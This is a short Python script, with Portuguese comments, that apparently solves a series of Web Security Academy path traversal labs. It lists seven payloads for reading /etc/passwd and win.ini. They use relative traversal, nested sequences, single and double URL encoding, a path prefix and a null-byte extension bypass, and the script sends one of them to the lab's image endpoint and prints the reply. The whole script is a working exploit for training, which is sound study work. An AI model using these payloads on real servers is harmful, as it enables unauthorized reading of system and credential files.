import requests

s = requests.Session()
url = "https://0ad000db04c79ada805b8a8d00c200b9.web-security-academy.net"

# GET da página inicial da aplicação
response = s.get(url=url)
# print(response.text)
# Analisando a response encontra-se várias tags html correspondentes as imagens
# <img src="/image?filename=nº_imagem.jpg">

# PAYLOADS
# LAB 01
payload_1 = "../../../../../../etc/passwd"
# LAB 02
payload_2 = "/etc/passwd"
# LAB 03
payload_3 = "....//....//....//....//....//....//etc/passwd"
payload_4 = r"....\\....\\....\\....\\...\\....\\windows\win.ini" # r é raw strings, não interpreta \ (escape)
# LAB 04
payload_5 = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" # URL encode
payload_5 = "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd " # URL double encode
# LAB 05
payload_6 = "/var/www/images/../../../etc/passwd"
# LAB 06
payload_7 = "../../../etc/passwd\x00.jpg" # \x00 = null

# GET da imagem
params={
    "filename": payload_7
}
response = s.get(url=f"{url}/image", params=params)
print(response.text)